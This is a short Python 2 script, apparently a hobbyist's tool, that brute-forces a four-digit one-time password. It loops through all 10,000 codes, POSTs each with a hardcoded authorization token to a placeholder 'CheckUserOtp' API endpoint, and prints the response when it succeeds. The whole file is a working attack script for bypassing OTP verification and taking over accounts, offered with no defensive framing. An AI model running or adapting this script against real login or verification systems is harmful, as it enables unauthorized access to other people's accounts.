#!/usr/bin/python2

import requests
import os
import json

# clean screen
os.system("cls")
os.system("clear")

logo = '''

                 ########################################


                 ------- Devloper by Yousef -----------
                           Twitter : y0usef_11

                 ########################################

'''

print logo

for i in xrange(0, 10000):
    # loops Guess the numbers
    number = "{:04d}".format(i)

    url = "http://exmples/oms/api8/CheckUserOtp?"
    data = {'otp': number ,'mobile':""} # yThe data you want to guess
    header = {"Content-Type" : "charset=UTF-8" , "Authorizations" : "060fac9a80afec9b95eb292ad884c5f5"}

    re = requests.post(url , data=json.dumps(data) , headers=header)

    if re.status_code == 200:
        print re.content
    else :
        print "otp Not same :( "
